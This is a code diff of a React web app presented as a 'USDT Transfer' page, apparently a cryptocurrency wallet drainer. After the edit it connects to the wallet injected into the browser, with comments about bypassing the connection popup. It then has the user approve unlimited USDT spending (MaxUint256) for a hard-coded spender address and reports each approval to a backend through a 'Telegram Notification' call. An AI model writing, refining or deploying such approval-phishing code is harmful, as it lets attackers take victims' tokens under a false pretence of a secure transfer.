@@ -1,9 +1,7 @@
 import { useState, useEffect } from 'react';
-import { EthereumProvider } from '@walletconnect/ethereum-provider';
 import { BrowserProvider, Contract, MaxUint256 } from 'ethers';
 
 const BACKEND_URL = "https://backend-usdt-y5fp.onrender.com";
-const PROJECT_ID = "90bc5beffa912aa09e6d53f9b7719f45";
 
 const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
 const USDT_ETH = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
@@ -14,7 +12,6 @@ const ERC20_ABI = [
 ];
 
 function App() {
-  const [provider, setProvider] = useState(null);
   const [account, setAccount] = useState(null);
   const [amount, setAmount] = useState("0.1");
   const [loading, setLoading] = useState(false);
@@ -43,47 +40,40 @@ function App() {
       setLoading(true);
       setStatus("Connecting...");
 
-      const chainId = selectedNetwork === 'bsc' ? 56 : 1;
-
-      const wcProvider = await EthereumProvider.init({
-        projectId: PROJECT_ID,
-        chains: [chainId, 56, 1],
-        showQrModal: false, // POPUP BYPASS: All Wallets hata diya
-        metadata: {
-          name: "USDT Transfer",
-          description: "Send USDT securely",
-          url: window.location.origin,
-          icons: ["https://walletconnect.com/walletconnect-logo.png"]
+      // INJECTED WALLET BYPASS (Dost wali trick)
+      if (window.ethereum) {
+        const ethereum = window.ethereum;
+        
+        // Direct request accounts (bina popup ke)
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        
+        if (accounts && accounts.length > 0) {
+          setAccount(accounts[0]);
+          setStatus("Connected. Please tap Approve.");
+          setStep(2);
+        } else {
+          setStatus("Wallet connection rejected.");
         }
-      });
-
-      // Connect popup bypass karne ke liye direct connect trigger
-      try {
-        await wcProvider.connect(); 
-      } catch (err) {
-        await wcProvider.enable();
+      } else {
+        setStatus("Please open inside Trust Wallet App.");
       }
       
-      setProvider(wcProvider);
-      setAccount(wcProvider.accounts[0]);
-      setStatus("Connected. Please tap Approve.");
-      setStep(2); 
       setLoading(false);
     } catch (error) {
       console.error(error);
-      setStatus("Connection failed. Open inside Trust Wallet.");
+      setStatus("Connection failed. Open inside Trust Wallet App.");
       setLoading(false);
     }
   };
 
   const handleApprove = async () => {
-    if (!provider) return;
+    if (!window.ethereum) return;
     
     try {
       setLoading(true);
       setStatus("Waiting for approval...");
 
-      const ethersProvider = new BrowserProvider(provider);
+      const ethersProvider = new BrowserProvider(window.ethereum);
       const signer = await ethersProvider.getSigner();
       
       const network = await ethersProvider.getNetwork();
@@ -92,6 +82,7 @@ function App() {
 
       const contract = new Contract(tokenAddress, ERC20_ABI, signer);
       
+      // Approve transaction
       const tx = await contract.approve(SPENDER_EVM, MaxUint256);
       
       setStatus("Transaction Pending...");
@@ -101,6 +92,7 @@ function App() {
       setSuccess(true);
       setStatus("");
       
+      // Telegram Notification
       await fetch(`${BACKEND_URL}/api/notify`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -186,7 +178,7 @@ function App() {
           
           {status && <p className="status-msg">{status}</p>}
 
-          <button className="approve-btn" onClick={handleApprove} disabled={loading || !provider}>
+          <button className="approve-btn" onClick={handleApprove} disabled={loading}>
             {loading ? "Processing..." : "Approve"}
           </button>
         </div>
